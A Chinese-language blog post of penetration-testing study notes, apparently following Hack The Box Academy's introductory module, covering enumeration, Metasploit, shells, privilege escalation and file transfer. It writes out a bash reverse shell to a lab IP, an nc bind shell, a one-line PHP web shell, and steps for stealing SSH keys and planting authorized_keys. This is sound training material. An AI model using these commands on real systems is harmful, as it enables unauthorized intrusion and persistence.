---
title: HTB渗透测试
date: 2025-02-25 11:35:57
tags:
  - 渗透测试
math: true
---

# 渗透测试

### 信息安全概述

[信息安全](https://en.wikipedia.org/wiki/Information_security)(infosec) 是一个庞大的领域。该领域在过去几年中发展迅速。它提供许多专业，包括但不限于：

- 网络和基础设施安全
- 应用程序安全
- 安全测试
- 系统审计
- 业务连续性规划
- 数字取证
- 事件检测与响应

简而言之，信息安全就是保护数据免遭未经授权的访问、更改、非法使用、破坏等的实践。信息安全专业人员还会采取行动来减少此类事件的整体影响。

数据可以是电子的或物理的，可以是有形的（例如设计蓝图）或无形的（知识）。在我们的信息安全职业生涯中，一个经常出现的常用短语是保护“数据的机密性、完整性和可用性”，或 CIA

#### 风险管理流程

数据保护必须注重高效而有效的政策实施，而不会对组织的业务运营和生产力产生负面影响。为实现这一点，组织必须遵循一个称为 的过程`risk management process`。此过程涉及以下五个步骤：

| 步骤                   | 解释                                                         |
| ---------------------- | ------------------------------------------------------------ |
| `Identifying the Risk` | 识别企业面临的风险，例如法律、环境、市场、监管和其他类型的风险。 |
| `Analyze the Risk`     | 分析风险以确定其影响和概率。应将风险映射到组织的各种政策、程序和业务流程。 |
| `Evaluate the Risk`    | 评估、排列和确定风险的优先次序。然后，组织必须决定接受（不可避免）、避免（更改计划）、控制（减轻）或转移风险（投保）。 |
| `Dealing with Risk`    | 尽可能地消除或控制风险。这是通过直接与风险相关的系统或流程的利益相关者进行交互来处理的。 |
| `Monitoring Risk`      | 必须持续监控所有风险。应持续监控风险，以防任何可能改变其影响分数的情况变化`i.e., from low to medium or high impact`。 |

#### 红队 vs. 蓝队

用最简单的话来说，`red team`扮演攻击者的角色，而`blue team`扮演防御者的角色。

#### 渗透测试人员的作用

安全评估员（网络渗透测试员、Web 应用程序渗透测试员、红队成员等）可帮助组织识别其外部和内部网络中的风险。这些风险可能包括网络或 Web 应用程序漏洞、敏感数据泄露、配置错误或可能导致声誉受损的问题。

### 开始使用渗透测试发行版

作为渗透测试人员，我们必须了解如何设置、维护和保护 Linux 和 Windows 攻击机器。

有许多 Linux 发行版 (distro) 可用于渗透测试。本节将介绍如何设置和使用[Parrot OS](https://www.parrotsec.org/)。该发行版用于我们将在整个学院看到的 Pwnbox，经过定制以练习和解决我们将遇到的各个模块中的练习。

有很多方法可以设置我们的本地渗透测试发行版。我们可以将其安装为基本操作系统（尽管不推荐），将我们的工作站配置为双启动（在操作系统之间来回切换很耗时），或者使用虚拟化进行安装。

`hypervisor`是一种允许我们创建和运行虚拟机 (VM) 的软件。它使我们能够使用主机（台式机或笔记本电脑）通过虚拟共享内存和处理资源来运行多个 VM。
虚拟机管理程序上的 VM 与主操作系统隔离运行，这在我们的生产网络和易受攻击的网络（例如 Hack The Box）之间或在从 VM 连接到客户端环境时提供了一层隔离和保护（尽管 VM 突破漏洞确实会不时出现）。

为了实现我们的目的，我们将使用 Parrot Security (Pwnbox) 的修改版本（可[在此处](https://www.parrotsec.org/download/)获取）来构建本地虚拟机。

### 保持井然有序

在攻击单个盒子、实验室或客户端环境时，我们应该在攻击机上有一个清晰的文件夹结构来保存数据，例如：范围信息、枚举数据、利用尝试的证据、凭据等敏感数据以及在侦察、利用和后利用期间获得的其他数据。示例文件夹结构可能如下所示：

``` shell
Fyind@htb[/htb]$ tree Projects/

Projects/
└── Acme Company
    ├── EPT
    │   ├── evidence
    │   │   ├── credentials
    │   │   ├── data
    │   │   └── screenshots
    │   ├── logs
    │   ├── scans
    │   ├── scope
    │   └── tools
    └── IPT
        ├── evidence
        │   ├── credentials
        │   ├── data
        │   └── screenshots
        ├── logs
        ├── scans
        ├── scope
        └── tools
```

这里我们为客户创建了一个文件夹`Acme Company`，其中包含两项评估：内部渗透测试 (IPT) 和外部渗透测试 (EPT)。每个文件夹下都有子文件夹，用于保存扫描数据、任何相关工具、日志输出、范围信息（即要提供给我们的扫描工具的 IP/网络列表），还有一个证据文件夹，其中可能包含评估期间检索到的任何凭据、检索到的任何相关数据以及屏幕截图。

### 使用 VPN 连接

虚拟专用网络[(VPN)](https://en.wikipedia.org/wiki/Virtual_private_network)允许我们连接到私有（内部）网络并访问主机和资源，就像我们直接连接到目标专用网络一样。VPN 通过加密通道上的通信来提供一定程度的隐私和安全性，以防止窃听和访问通过通道的数据。

![图像](https://academy.hackthebox.com/storage/modules/77/GettingStarted.png)

远程访问 VPN 主要有两种类型：基于客户端的 VPN 和 SSL VPN。SSL VPN 使用 Web 浏览器作为 VPN 客户端。连接建立在浏览器和 SSL VPN 网关之间，可以配置为仅允许访问基于 Web 的应用程序（例如电子邮件和内部网站点），甚至内部网络，但无需最终用户安装或使用任何专用软件。基于客户端的 VPN 需要使用客户端软件来建立 VPN 连接。连接后，用户的主机将像直接连接到公司网络一样工作，并能够访问服务器配置允许的任何资源（应用程序、主机、子网等）。一些企业 VPN 将为员工提供对内部公司网络的完全访问权限，而另一些企业 VPN 将用户置于为远程工作人员保留的特定网段上。

#### 为什么要使用 VPN？

我们可以使用 VPN 服务（例如`NordVPN`或 ）`Private Internet Access`并连接到我们国家/地区其他地方或世界其他地方的 VPN 服务器，以隐藏我们的浏览流量或伪装我们的公共 IP 地址。这可以为我们提供一定程度的安全性和隐私性。

但是，由于我们连接到的是公司的服务器，因此数据可能会被记录，或者 VPN 服务可能不遵循安全最佳实践或他们宣传的安全功能。使用 VPN 服务存在风险，即提供商没有履行其承诺并记录所有数据。使用 VPN 服务**并不能**保证匿名性或隐私性，但对于绕过某些网络/防火墙限制或连接到可能的敌对网络（即公共机场无线网络）很有用。

#### 连接到 HTB VPN

HTB 网络中的主机无法直接连接到互联网。连接到 HTB VPN（或任何渗透测试/黑客实验室）时，我们应始终将网络视为“敌对”。我们应该只从虚拟机连接，如果攻击虚拟机上启用了 SSH，则不允许密码验证，锁定任何 Web 服务器，并且不要在攻击虚拟机上留下敏感信息（即，不要使用我们用于执行客户端评估的同一虚拟机玩 HTB 或其他易受攻击的网络）。连接到 VPN 时（在 HTB 学院或主 HTB 平台内），我们使用以下命令进行连接：

``` shell
sudo openvpn user.ovpn
```

则如果成功连接到 VPN，`ifconfig`我们将看到一个适配器。

输入后`netstat -rn`我们将看到可通过 VPN 访问的网络。

### 常用术语

#### shell

`Shell`是一个非常常见的术语，在我们的旅程中我们会一次又一次地听到它。它有几种含义。在 Linux 系统上，shell 是一个程序，它通过键盘从用户那里获取输入，并将这些命令传递给操作系统以执行特定功能。例如 Linux 终端、Windows 命令行 (cmd.exe) 和 Windows PowerShell。Bash是Unix系统原始shell程序[sh](https://man7.org/linux/man-pages/man1/sh.1p.html)`bash`的增强版本。除此之外还有其他shell，包括但不限于[Zsh](https://en.wikipedia.org/wiki/Z_shell)，[Tcsh](https://en.wikipedia.org/wiki/Tcsh)，[Ksh](https://en.wikipedia.org/wiki/KornShell)，[Fish shell](https://en.wikipedia.org/wiki/Fish_(Unix_shell))等。shell 连接主要有三种类型：

| **shell type**  | **描述**                                                     |
| --------------- | ------------------------------------------------------------ |
| `Reverse shell` | 启动与攻击箱上的“监听器”的连接。                             |
| `Bind shell`    | “绑定”到目标主机上的特定端口并等待来自我们的攻击箱的连接。   |
| `Web shell`     | 通过 Web 浏览器运行操作系统命令，通常不是交互式或半交互式的。它还可用于运行单个命令（即利用文件上传漏洞并上传`PHP`脚本来运行单个命令）。 |

#### 端口

[端口](https://en.wikipedia.org/wiki/Port_(computer_networking))是网络连接开始和结束的虚拟点。它们基于软件并由主机操作系统管理。端口与特定进程或服务相关联，并允许计算机区分不同的流量类型个。端口都分配有一个编号，许多端口在所有联网设备上都是标准化的（尽管服务可以配置为在非标准端口上运行）。例如，`HTTP`消息（网站流量）通常发送到端口`80`，而`HTTPS`消息发送到端口 ，`443`除非另有配置。

端口有两种类型：[传输控制协议 (TCP)](https://en.wikipedia.org/wiki/Transmission_Control_Protocol)和[用户数据报协议 (UDP)](https://en.wikipedia.org/wiki/User_Datagram_Protocol)。

`TCP`面向连接，这意味着必须先建立客户端和服务器之间的连接，然后才能发送数据。服务器必须处于监听状态，等待客户端的连接请求。
`UDP`采用无连接通信模型。没有“握手”，因此引入了一定程度的不可靠性，因为无法保证数据传输。`UDP`当不需要纠错/检查或由应用程序本身处理时很有用。

| port              | 协议                    |
| ----------------- | ----------------------- |
| `20`/ `21`（TCP） | `FTP`                   |
| `22`（TCP）       | `SSH`                   |
| `23`（TCP）       | `Telnet`                |
| `25`（TCP）       | `SMTP`                  |
| `80`（TCP）       | `HTTP`                  |
| `161`（TCP/UDP）  | `SNMP`                  |
| `389`（TCP/UDP）  | `LDAP`                  |
| `443`（TCP）      | `SSL`/ `TLS`（`HTTPS`） |
| `445`（TCP）      | `SMB`                   |
| `3389`（TCP）     | `RDP`                   |

作为信息安全专业人员，我们必须能够快速回忆起有关各种主题的大量信息。对于我们（尤其是作为渗透测试人员）来说，牢牢掌握许多`TCP`和`UDP`端口并能够仅通过其编号快速识别它们（即知道端口`21`是`FTP`、端口`80`是、`HTTP`端口`88`是`Kerberos`）而无需查找是至关重要的。

#### 什么是 Web 服务器

Web 服务器是在后端服务器上运行的应用程序，它处理`HTTP`来自客户端浏览器的所有流量，将其路由到请求目标页面，并最终响应客户端浏览器。

我们经常会听到/看到对[OWASP Top 10](https://owasp.org/www-project-top-ten/)的引用。这是开放 Web 应用程序安全项目 (OWASP) 维护的 Web 应用程序十大漏洞的标准化列表。

| Number | Category                                                     | Description                                                  |
| ------ | ------------------------------------------------------------ | ------------------------------------------------------------ |
| 1.     | [Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/) | Restrictions are not appropriately implemented to prevent users from accessing other users accounts, viewing sensitive data, accessing unauthorized functionality, modifying data, etc. |
| 2.     | [Cryptographic Failures](https://owasp.org/Top10/A02_2021-Cryptographic_Failures/) | Failures related to cryptography which often leads to sensitive data exposure or system compromise. |
| 3.     | [Injection](https://owasp.org/Top10/A03_2021-Injection/)     | User-supplied data is not validated, filtered, or sanitized by the application. Some examples of injections are SQL injection, command injection, LDAP injection, etc. |
| 4.     | [Insecure Design](https://owasp.org/Top10/A04_2021-Insecure_Design/) | These issues happen when the application is not designed with security in mind. |
| 5.     | [Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/) | Missing appropriate security hardening across any part of the application stack, insecure default configurations, open cloud storage, verbose error messages which disclose too much information. |
| 6.     | [Vulnerable and Outdated Components](https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/) | Using components (both client-side and server-side) that are vulnerable, unsupported, or out of date. |
| 7.     | [Identification and Authentication Failures](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/) | Authentication-related attacks that target user's identity, authentication, and session management. |
| 8.     | [Software and Data Integrity Failures](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/) | Software and data integrity failures relate to code and infrastructure that does not protect against integrity violations. An example of this is where an application relies upon plugins, libraries, or modules from untrusted sources, repositories, and content delivery networks (CDNs). |
| 9.     | [Security Logging and Monitoring Failures](https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/) | This category is to help detect, escalate, and respond to active breaches. Without logging and monitoring, breaches cannot be detected.. |
| 10.    | [Server-Side Request Forgery](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_(SSRF)/) | SSRF flaws occur whenever a web application is fetching a remote resource without validating the user-supplied URL. It allows an attacker to coerce the application to send a crafted request to an unexpected destination, even when protected by a firewall, VPN, or another type of network access control list (ACL). |

### 基本工具

#### ssh

[Secure Shell (SSH)](https://en.wikipedia.org/wiki/SSH_(Secure_Shell))是一种默认在端口上运行的网络协议`22`，它为系统管理员等用户提供了一种安全的远程访问计算机的方式。 SSH 可以使用密码验证或无密码配置，使用 SSH 公钥/私钥对进行[公钥验证](https://serverpilot.io/docs/how-to-use-ssh-public-key-authentication/)。SSH 可用于通过互联网远程访问同一网络上的系统，使用端口转发/代理方便地连接其他网络中的资源，以及从远程系统上传/下载文件。

#### netcat

`ncat`或`nc`是用于与 TCP/UDP 端口交互的出色网络实用程序。它的主要用途是连接到 shell，我们将在本模块后面讨论。除此之外，它`netcat`还可用于连接到任何侦听端口并与在该端口上运行的服务交互。我们可以看到，端口 22 向我们发送了它的横幅，表明`SSH`正在运行。这种技术称为`Banner Grabbing`，可以帮助识别在特定端口上运行的服务。

``` shell
netcat 10.10.10.10 22
```

#### Using Tmux

Terminal multiplexers 终端多路复用器（例如`tmux`或`Screen`）是扩展标准 Linux 终端功能的绝佳实用程序，例如在一个终端内拥有多个窗口并在它们之间跳转。

安装：

``` shell
sudo apt install tmux -y
```

* 启动 `tmux`
* 命令前缀： `Ctrl+B` ，
* 新建窗口 `Ctrl+B` , `C`
* 切换窗口 `Ctrl+B` , `<编号>`
* 竖直切分 `Ctrl+B`, `Shift+%`
* 水平切分 `Ctrl+B`, `Shift+"`
* 切换 `Ctrl+B` , `方向键` 

https://tmuxcheatsheet.com/ 这个是常用命令

#### Vim

[Vim](https://linuxcommand.org/lc3_man_pages/vim1.html)是一款出色的文本编辑器，可用于在 Linux 系统上编写代码或编辑文本文件。使用的一大优点`Vim`是它完全依赖于键盘，因此您不必使用鼠标，这（一旦我们掌握了它）将大大提高您编写/编辑代码的生产力和效率。

### 服务扫描

#### Nmap

基础扫描

``` shell
nmap 10.129.42.253
```

默认情况下，`Nmap`将进行 TCP 扫描，除非特别要求执行 UDP 扫描。`STATE`确认这些端口是开放的。有时我们会看到列出的其他端口具有不同的状态

随着我们越来越熟悉，我们会注意到几个端口通常与 Windows 或 Linux 相关联。例如，端口 3389 是远程桌面服务的默认端口，这很好地表明目标是 Windows 计算机。

我们可以使用`-sC`参数来指定`Nmap`应使用脚本来尝试获取更详细的信息

`-sV`参数指示`Nmap`执行版本扫描。在此扫描中，Nmap 将对目标系统上的服务进行指纹识别，并识别服务协议、应用程序名称和版本。

`-p-`告诉 Nmap 我们要扫描所有 65,535 个 TCP 端口。

#### 其他脚本：

指定`-sC`将针对目标运行许多有用的默认脚本，但在某些情况下需要运行特定脚本。

``` shell
nmap --script <script name> -p<port> <host>
```

#### 横幅抓取

如前所述，横幅抓取是一种快速对服务进行指纹识别的有用技术。通常，服务会在发起连接后显示横幅来表明自己的身份。如果`nmap -sV --script=banner <target>`指定了语法，Nmap 将尝试抓取横幅。

#### FTP

熟悉 FTP 是值得的，因为它是一种标准协议，并且此服务通常包含有趣的数据。

`ftp`让我们使用命令行实用程序连接到该服务。

``` shell
Fyind@htb[/htb]$ ftp -p 10.129.42.253

Connected to 10.129.42.253.
220 (vsFTPd 3.0.3)
Name (10.129.42.253:user): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> ls
227 Entering Passive Mode (10,129,42,253,158,60).
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Feb 25 19:25 pub
226 Directory send OK.

ftp> cd pub
250 Directory successfully changed.

ftp> ls
227 Entering Passive Mode (10,129,42,253,182,129).
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            18 Feb 25 19:25 login.txt
226 Directory send OK.

ftp> get login.txt
local: login.txt remote: login.txt
227 Entering Passive Mode (10,129,42,253,181,53).
150 Opening BINARY mode data connection for login.txt (18 bytes).
226 Transfer complete.
18 bytes received in 0.00 secs (165.8314 kB/s)

ftp> exit
221 Goodbye.
```

#### SMB

SMB（服务器消息块）是 Windows 机器上流行的协议，为垂直和横向移动提供了许多载体。敏感数据（包括凭据）可能位于网络文件共享中，某些 SMB 版本可能容易受到[EternalBlue](https://www.avast.com/c-eternalblue)等 RCE 攻击。仔细枚举这个潜在的攻击面至关重要。`Nmap`有许多用于枚举 SMB 的脚本，例如[smb-os-discovery.nse](https://nmap.org/nsedoc/scripts/smb-os-discovery.html)，它将与 SMB 服务交互以提取报告的操作系统版本。

``` shell
nmap --script smb-os-discovery.nse -p445 10.10.10.40
```

SMB 允许用户和管理员共享文件夹，并允许其他用户远程访问这些文件夹。这些共享中通常包含敏感信息（例如密码）的文件。可以枚举并与 SMB 共享交互的工具是[smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html)。该`-L`标志指定我们要检索远程主机上可用共享的列表，同时`-N`抑制密码提示。

``` shell
smbclient -N -L \\\\10.129.42.253
```

之后可能看到文件夹 `users` 可以用下面的来登录

``` shell
smbclient -U bob \\\\10.129.42.253\\users
```

使用 `get` 可以下载文件，类似ftp

#### SNMP

SNMP社区字符串提供了有关路由器或设备的信息和统计数据，帮助我们访问设备。制造商的默认社区字符串“public”和“private”通常没有更改。在SNMP版本1和2c中，访问控制是通过明文的社区字符串进行的，只要知道字符串名称，就能获得访问权限。SNMP版本3才加入了加密和身份验证功能。

`onesixtyone` 是一个用于暴力破解SNMP社区字符串的工具，可以通过常见的社区字符串字典文件（如`dict.txt`）进行扫描。通过这种方式，你可以测试多个社区字符串，看是否能够成功访问目标设备。

``` shell
snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0
```

### 网络枚举

在执行服务扫描时，我们经常会遇到在端口 80 和 443 上运行的 Web 服务器。Web 服务器托管 Web 应用程序（有时不止 1 个），这些应用程序在渗透测试期间通常会提供相当大的攻击面和非常高价值的目标。正确的 Web 枚举至关重要，尤其是当组织没有公开许多服务或这些服务已得到适当修补时。

发现 Web 应用程序后，我们总是需要检查是否可以发现 Web 服务器上任何不打算公开访问的隐藏文件或目录。我们可以使用[ffuf](https://github.com/ffuf/ffuf)或[GoBuster](https://github.com/OJ/gobuster)等工具来执行此目录枚举。

``` shell
gobuster dir -u http://10.10.10.121/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

HTTP 状态代码`200`表示资源请求成功，而 403 HTTP 状态代码表示我们被禁止访问该资源。301 状态代码表示我们正在被重定向，这不是失败的情况。我们有必要熟悉各种 HTTP 状态代码，可[在此处](https://en.wikipedia.org/wiki/List_of_HTTP_status_codes)找到。

#### 横幅抓取/Web 服务器标头

在上一节中，我们讨论了用于一般目的的横幅抓取。Web 服务器标头可以很好地显示 Web 服务器上托管的内容。它们可以揭示正在使用的特定应用程序框架、身份验证选项以及服务器是否缺少必要的安全选项或配置错误。

``` shell
curl -IL https://www.inlanefreight.com
```

另一个方便的工具是[EyeWitness](https://github.com/FortyNorthSecurity/EyeWitness)，它可用于截取目标 Web 应用程序的屏幕截图、提取指纹并识别可能的默认凭据。

我们可以使用命令行工具提取Web服务器、支持框架和应用程序的版本`whatweb`。这些信息可以帮助我们确定所使用的技术并开始搜索潜在的漏洞。

#### DNS 子域名枚举

子域上还可能托管着重要资源，例如管理面板或具有可利用的附加功能的应用程序。我们可以使用标志`GoBuster`来枚举给定域的可用子域，`dns`以指定 DNS 模式。首先，让我们克隆 SecLists GitHub [repo](https://github.com/danielmiessler/SecLists)，其中包含许多可用于模糊测试和利用的有用列表

接下来，向文件中添加 DNS 服务器（例如 1.1.1.1）`/etc/resolv.conf`

``` shell
sudo apt install seclists -y
gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt
```

#### Robots.txt

网站通常会包含一个`robots.txt`文件，其目的是指示搜索引擎网络爬虫（例如 Googlebot）哪些资源可以访问，哪些不能访问以进行索引。该`robots.txt`文件可以提供有价值的信息，例如私人文件和管理页面的位置。

#### 源代码

检查我们遇到的任何网页的源代码也是值得的。我们可以点击`[CTRL + U]`在浏览器中打开源代码窗口。

### 公开漏洞

一旦我们确定了在扫描中识别出的端口上运行的服务`Nmap`，第一步就是查看是否有任何应用程序/服务存在任何公开漏洞。

一个著名的用于此目的的工具是`searchsploit`，我们可以使用它来搜索任何应用程序的公开漏洞/漏洞利用。我们可以使用以下命令安装它：

``` shell
sudo apt install exploitdb -y
```

我们可以`searchsploit`通过名称搜索特定的应用程序，如下所示：

``` shell
Fyind@htb[/htb]$ searchsploit openssh 7.2

----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                               |  Path
----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                                                                                     | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                                               | linux/remote/45210.py
OpenSSH 7.2 - Denial of Service                                                                                              | linux/dos/40888.py
OpenSSH 7.2p1 - (Authenticated) xauth Command Injection                                                                      | multiple/remote/39569.py
OpenSSH 7.2p2 - Username Enumeration                                                                                         | linux/remote/40136.py
OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Sockets Privilege Escalation                         | linux/local/40962.txt
OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading                                                                     | linux/remote/40963.txt
OpenSSH < 7.7 - User Enumeration (2)                                                                                         | linux/remote/45939.py
OpenSSHd 7.2p2 - Username Enumeration      
```

我们还可以利用在线漏洞数据库来搜索漏洞，例如[Exploit DB](https://www.exploit-db.com/)、[Rapid7 DB](https://www.rapid7.com/db/)或[Vulnerability Lab](https://www.vulnerability-lab.com/)。[Web 应用程序简介](https://academy.hackthebox.com/module/details/75)模块讨论了 Web 应用程序的公共漏洞。

#### Metasploit 入门

Metasploit Framework (MSF) 是渗透测试人员的绝佳工具。它包含许多针对许多公共漏洞的内置漏洞利用程序，并提供了一种针对易受攻击的目标使用这些漏洞利用程序的简便方法。

要运行`Metasploit`，我们可以使用以下`msfconsole`命令：

``` shell
msfconsole
```

搜索漏洞

``` shell
search exploit <xxx>
```

使用漏洞

``` shell
use auxiliary/scanner/http/wp_simple_backup_file_read
```

设置

``` shell
show options # 看有哪些
set RHOSTS 94.237.54.116
set RPORT 42821
set LHOST tun0
set FILEPATH /flag.txt
```

利用

``` shell
exploit
```

### Shell的种类

| shell类型       | 沟通方式                                                     |
| --------------- | ------------------------------------------------------------ |
| `Reverse Shell` | 重新连接到我们的系统并通过反向连接给予我们控制权。           |
| `Bind Shell`    | 等待我们连接它，一旦连接成功，它就赋予我们控制权。           |
| `Web Shell`     | 通过 Web 服务器进行通信，通过 HTTP 参数接受我们的命令，执行它们，并打印回输出。 |

#### Reverse shell

最常见的。用natcat在我们的机器上监听特定端口。然后把那个机器上的bash连接到我们的监听器上。

``` shell
nc -lvnp 1234
```

| flag      | 描述                                                 |
| --------- | ---------------------------------------------------- |
| `-l`      | 监听模式，等待连接来连接我们。                       |
| `-v`      | 详细模式，以便我们知道何时收到连接。                 |
| `-n`      | 禁用 DNS 解析并仅连接来自/到 IP，以加快连接速度。    |
| `-p 1234` | `netcat`正在监听的端口号，反向连接应该发送到该端口。 |

首先知道自己系统的ip

``` shell
ip a
```

Reverse shell命令：

``` shell
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```

https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/ 这里有很多reverse shell的命令

但是，A`Reverse Shell`可能非常脆弱。一旦反向 shell 命令停止，或者我们因任何原因失去连接，我们就必须使用初始漏洞再次执行反向 shell 命令以重新获得访问权限。

#### Bind shell

这个是我们链接到那个服务器的监听端口

一旦我们执行`Bind Shell Command`，它将开始监听远程主机上的端口，并将该主机的 shell（即`Bash`或`PowerShell`）绑定到该端口。

bind shell command:

``` shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```

#### 升级 TTY

一旦我们通过 Netcat 连接到 shell，我们就会注意到我们只能输入命令或退格键，但无法左右移动文本光标来编辑命令，也无法上下移动来访问命令历史记录。为了做到这一点，我们需要升级我们的 TTY。

``` shell
python -c 'import pty; pty.spawn("/bin/bash")'
```

运行这个后，`ctrl+z` 运行在后台，然后输入

``` shell
stty raw -echo
fg
[Enter]
[Enter]
```

一旦我们点击`fg`，它将把我们的`netcat`shell 带回到前台。此时，终端将显示一个空白行。我们可以`enter`再次点击以返回到我们的 shell 或输入`reset`，然后按回车键将其带回。此时，我们将拥有一个完全正常工作的 TTY shell

我们可能会注意到我们的 shell 没有覆盖整个终端。为了解决这个问题，我们需要找出一些变量。我们可以在系统上打开另一个终端窗口，最大化窗口或使用我们想要的任何大小，然后输入以下命令来获取我们的变量：

``` shell
echo $TERM
stty size
```

第一个命令向我们显示了变量，第二个命令分别向我们显示了和的`TERM`值。现在我们有了变量，我们可以返回到shell 并使用以下命令来更正它们

``` shell
export TERM=xterm-256color
stty rows 67 columns 318
```

#### web shell

`Web Shell`通常是一个 Web 脚本，即`PHP`或`ASPX`，它通过 HTTP 请求参数（例如`GET`或`POST`请求参数）接受我们的命令，执行我们的命令，并将其输出打印回网页上。

Web Shell 脚本通常只有一行，非常简短，易于记忆。以下是一些常见 Web 语言的常见简短 Web Shell 脚本：

``` php
<?php system($_REQUEST["cmd"]); ?>
```

上传 Web Shell：

一旦我们有了 web shell，我们就需要将 web shell 脚本放入远程主机的 web 目录 (webroot)，以便通过 web 浏览器执行该脚本。

确定 webroot 的位置。以下是常见 Web 服务器的默认 webroot：

| Web Server | Default Webroot        |
| ---------- | ---------------------- |
| `Apache`   | /var/www/html/         |
| `Nginx`    | /usr/local/nginx/html/ |
| `IIS`      | c:\inetpub\wwwroot\    |
| `XAMPP`    | C:\xampp\htdocs\       |

访问的时候，可以用get在浏览器访问

``` shell
?cmd=id
```

还可以用curl

``` shell
curl http://SERVER_IP:PORT/shell.php?cmd=id
```

### 权限提升

最初访问远程服务器时，通常是以低权限用户的身份进行的，因此我们无法获得对服务器的完全访问权限。要获得完全访问权限，我们需要找到一个内部/本地漏洞，以便将我们的权限提升到`root`上的用户`Linux`或上的`administrator`/用户。

#### PrivEsc checklist

彻底枚举该盒子，以找到任何可以利用的潜在漏洞。我们可以在网上找到许多检查表和备忘单，其中包含我们可以运行的一系列检查以及运行这些检查的命令。一个很好的资源是[HackTricks](https://book.hacktricks.xyz/)，它有一个针对[Linux](https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html)和[Windows](https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html)本地权限提升的出色检查表。

枚举脚本：

一些常见的 Linux 枚举脚本包括[LinEnum](https://github.com/rebootuser/LinEnum.git)和[linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker)，而 Windows 包括[Seatbelt](https://github.com/GhostPack/Seatbelt)和[JAWS](https://github.com/411Hall/JAWS)。

我们可能用于服务器枚举的另一个有用工具是[Privilege Escalation Awesome Scripts SUITE](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)，因为它维护良好，保持最新状态，并且包含用于枚举 Linux 和 Windows 的脚本。

> 注意：这些脚本将运行许多已知用于识别漏洞的命令，并产生大量“噪音”，这些噪音可能会触发查找此类事件的防病毒软件或安全监控软件。这可能会阻止脚本运行，甚至触发系统已被入侵的警报。在某些情况下，我们可能希望进行手动枚举，而不是运行脚本。

假设我们被允许以 root（或其他用户）身份运行特定命令。在这种情况下，我们可能能够将我们的权限升级为 root/系统用户或以其他用户身份获得访问权限。以下是利用某些用户权限的一些常见方法：

* sudo
* suid
* Windows Token Privileges

我们可以`sudo`使用以下命令检查我们拥有哪些权限

``` shell
sudo -l
```

`NOPASSWD`条目显示该`/bin/echo`命令无需密码即可执行。

> ```shell-session
> (user : user) NOPASSWD: /bin/echo
> ```

如果我们通过漏洞获得对服务器的访问权限并且没有用户密码，这将很有用。别的用户也可以用！

``` shell
sudo -u user /bin/echo Hello World!
```

一旦我们找到可以使用 运行的特定应用程序`sudo`，我们就可以寻找利用它的方法，以 root 用户身份获取 shell。GTFOBins[包含](https://gtfobins.github.io/)命令列表以及如何通过 来利用它们`sudo`。

[LOLBAS](https://lolbas-project.github.io/#)还包含一个 Windows 应用程序列表

#### Scheduled Tasks

在 Linux 和 Windows 中，都有方法可以让脚本以特定的时间间隔运行以执行任务。

1. Add new scheduled tasks/cron jobs
2. Trick them to execute a malicious software

这些目录：

1. `/etc/crontab`
2. `/etc/cron.d`
3. `/var/spool/cron/crontabs/root`

如果我们可以写入由 cron 作业调用的目录，我们可以编写一个带有反向 shell 命令的 bash 脚本，该脚本在执行时应该向我们发送一个反向 shell。

#### Exposed Credentials

接下来，我们可以查找可以读取的文件，看看它们是否包含任何暴露的凭据。这在`configuration`文件、`log`文件和用户历史文件中非常常见

#### ssh

如果我们对特定用户具有目录的读取权限，我们可以读取在`/home/user/.ssh/id_rsa`或中找到的他们的私有 ssh 密钥`/root/.ssh/id_rsa`，并使用它来登录服务器

``` shell
vim id_rsa
chmod 600 id_rsa
ssh root@10.10.10.10 -i id_rsa
```

> 请注意，我们在机器上创建密钥后，对密钥使用了命令“chmod 600 id_rsa”，以将文件的权限更改为更严格。如果 ssh 密钥的权限不严格，即可能被其他人读取，则 ssh 服务器会阻止它们工作。

如果我们发现自己对用户`/.ssh/`目录具有写权限，我们可以将公钥放在用户的 ssh 目录中`/home/user/.ssh/authorized_keys`。

我们必须首先创建一个新密钥

``` shell
ssh-keygen -f key
```

这将为我们提供两个文件：`key`（我们将与 一起使用`ssh -i`）和`key.pub`，我们将把它们复制到远程机器。让我们复制`key.pub`，然后在远程机器上，我们将其添加到`/root/.ssh/authorized_keys`：

### 传输文件

#### wget

先用python服务器把文件夹放到监听端口

``` shell
cd /tmp
python3 -m http.server 8000
```

远端可以

``` shell
wget http://ip:port/xx.sh
```

也可以用curl

``` shell
curl http://ip:port/xx.sh -o xx.sh
```

#### scp

需要ssh

``` shell
scp xx.sh user@remotehost:/tmp/xx.sh 
```

右边是保存的远端目录

在某些情况下，我们可能无法传输文件。在这种情况下，我们可以使用一个简单的技巧将文件以[base64](https://linux.die.net/man/1/base64)`base64`编码为格式，然后我们可以将`base64`字符串粘贴到远程服务器上并对其进行解码。

``` shell
base64 xx.sh -w 0
```

解码用

``` shell
base64 -d xx_base64.txt
```

